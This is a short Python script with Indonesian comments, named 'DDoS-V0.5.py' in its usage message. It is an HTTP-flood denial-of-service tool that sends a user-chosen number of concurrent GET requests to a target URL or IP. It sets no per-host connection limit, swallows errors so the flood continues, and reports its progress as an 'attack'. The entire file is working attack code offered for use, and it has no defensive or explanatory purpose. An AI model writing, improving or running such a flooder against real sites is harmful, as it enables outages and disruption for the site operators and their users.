import asyncio
import aiohttp
import sys
import time

# Fungsi untuk mengirim request
async def send(session, url):
    try:
        async with session.get(url):
            pass  # Biarkan request berjalan tanpa output
    except Exception as e:
        pass  # Jika error, jangan tampilkan apapun

# Fungsi utama untuk mengatur serangan
async def main(url, jumlah):
    jumlah = int(jumlah)
    conn = aiohttp.TCPConnector(limit_per_host=0)  # Koneksi tanpa batas
    timeout = aiohttp.ClientTimeout(total=3)  # Timeout setiap request

    # Menampilkan pesan sebelum serangan
    print(f"\n[+] Proses Mengirim Serangan Ke IP Tersebut: {url}")
    start = time.time()

    try:
        # Membuat session dan menjalankan banyak request sekaligus
        async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
            tasks = [send(session, url) for _ in range(jumlah)]
            await asyncio.gather(*tasks)
    except Exception as e:
        print(f"[!] Terjadi error: {e}")
        return

    # Menampilkan hasil setelah selesai
    durasi = time.time() - start
    print(f"[✓] Selesai Mengirim Serangan ({jumlah} request) dalam {durasi:.2f} detik\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[!] Penggunaan: python DDoS-V0.5.py <url> <jumlah_request>")
    else:
        url = sys.argv[1]  # IP atau URL target
        jumlah = sys.argv[2]  # Jumlah request yang akan dikirim
        try:
            # Memastikan kita mengirim dalam waktu 5 detik
            print("[!] Mulai serangan...")
            asyncio.run(main(url, jumlah))  # Jalankan fungsi utama
        except KeyboardInterrupt:
            print("\n[!] Serangan dihentikan oleh user.")
        except Exception as e:
            print(f"[!] Terjadi kesalahan: {e}")